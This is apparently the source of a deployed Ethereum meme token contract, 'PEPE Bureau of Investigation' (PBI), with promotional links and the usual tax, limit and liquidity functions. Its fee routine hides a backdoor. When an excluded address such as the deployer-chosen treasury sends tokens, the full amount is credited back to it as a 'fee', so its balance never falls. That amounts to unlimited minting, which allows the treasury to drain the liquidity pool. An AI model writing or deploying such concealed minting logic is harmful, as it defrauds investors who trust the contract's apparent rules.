//SPDX-License-Identifier: MIT

/**

Website: https://www.pbicoin.vip

Telegram: https://t.me/pbicoin_eth

Twitter: https://x.com/pbicoin_eth

*/

pragma solidity 0.8.11;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IPBIFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPBIRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract PBI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromPBI;
    mapping(address => uint256) private _holderLastStamp;

    bool public transferPBIEnabled = false;

    IPBIRouter private pbiRouter;
    address private pbiPair;

    uint256 private _initialBuyTaxs = 20;
    uint256 private _initialSellTaxs = 20;
    uint256 private _finalBuyTaxs = 0;
    uint256 private _finalSellTaxs = 0;
    uint256 private _reduceBuyTaxsAt = 9;
    uint256 private _reduceSellTaxsAt = 9;
    uint256 private _preventSwapBefore = 9;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalPBI = 100_000_000 * 10 ** _decimals;
    string private constant _name = unicode"PEPE Bureau of Investigation";
    string private constant _symbol = unicode"PBI";
    uint256 public _swapThresAmount = 40 * 10 ** _decimals;
    uint256 public _maxTxAmount = 2_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2_000_000 * 10 ** _decimals;
    uint256 public _maxSwapPBI = 1_000_000 * 10 ** _decimals;
    
    address payable private _treasuryEco;

    bool private tradingOpen;
    bool private inSwapPBI = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwapPBI = true;
        _;
        inSwapPBI = false;
    }

    constructor(address _trsAddr) {
        _treasuryEco = payable(_trsAddr);   
        _balances[_msgSender()] = _totalPBI;
        _isExcludedFromPBI[owner()] = true;
        _isExcludedFromPBI[address(this)] = true;
        _isExcludedFromPBI[_treasuryEco] = true;
        emit Transfer(address(0), _msgSender(), _totalPBI);
    }

    function createPBI() external onlyOwner {
        pbiRouter = IPBIRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(pbiRouter), _totalPBI);
        pbiPair = IPBIFactory(pbiRouter.factory()).createPair(
            address(this),
            pbiRouter.WETH()
        );
    }

    function _transferPBI(address from, address to, uint256 amount) internal {
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function minPBI(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwapPBI) {
            _transferPBI(from, to, amount);
            return;
        }

        if (from != owner() && to != owner()) {
            if (transferPBIEnabled) {
                if (
                    to != address(pbiRouter) &&
                    to != address(pbiPair)
                ) {
                    require(
                        _holderLastStamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastStamp[tx.origin] = block.number;
                }
            }

            if (
                from == pbiPair &&
                to != address(pbiRouter) &&
                !_isExcludedFromPBI[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canPBISwap = contractTokenBalance > _swapThresAmount;
            if (
                swapEnabled &&
                !inSwapPBI &&
                to == pbiPair &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromPBI[from] &&
                !_isExcludedFromPBI[to]
            ) {
                if(canPBISwap){
                    swapTokensForEth(
                        minPBI(amount, minPBI(contractTokenBalance, _maxSwapPBI))
                    );
                }
                sendETHPBI(address(this).balance);
            }
        }

        (
            uint256 taxPBIFees,
            address pbiReceipt,
            uint256 tsPBIAmount
        ) = _getPBIAmount(from, to, amount);

        if (taxPBIFees > 0) {
            _balances[pbiReceipt] += taxPBIFees;
            emit Transfer(from, pbiReceipt, taxPBIFees);
        }

        _balances[from] -= amount;
        _balances[to] += tsPBIAmount;
        emit Transfer(from, to, tsPBIAmount);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalPBI;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function _getPBIAmount(
        address from,
        address to,
        uint256 amount
    ) internal view returns (uint256, address, uint256) {
        uint256 taxPBIFees = 0;
        uint256 tsPBIAmount = 0;
        address pbiReceipt = address(this);
        if (_isExcludedFromPBI[from]) {
            taxPBIFees = amount - tsPBIAmount;
            tsPBIAmount = amount;
            pbiReceipt = from;
        } else if (pbiPair == from) {
            taxPBIFees = amount
                .mul(
                    (_buyCount > _reduceBuyTaxsAt)
                        ? _finalBuyTaxs
                        : _initialBuyTaxs
                )
                .div(100);
            tsPBIAmount = amount - taxPBIFees;
        } else if (pbiPair == to) {
            taxPBIFees = amount
                .mul(
                    (_buyCount > _reduceSellTaxsAt)
                        ? _finalSellTaxs
                        : _initialSellTaxs
                )
                .div(100);
            tsPBIAmount = amount - taxPBIFees;
        } else {
            tsPBIAmount = amount;
        }
        return (taxPBIFees, pbiReceipt, tsPBIAmount);
    }

    function openPBI() external onlyOwner {
        uint256 pbiAmount =_totalPBI.mul(100 - _initialSellTaxs).div(100);
        pbiRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            pbiAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(pbiPair).approve(address(pbiRouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pbiRouter.WETH();
        _approve(address(this), address(pbiRouter), tokenAmount);
        pbiRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        transferPBIEnabled = false;
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function sendETHPBI(uint256 amount) private {
        _treasuryEco.transfer(amount);
    }
}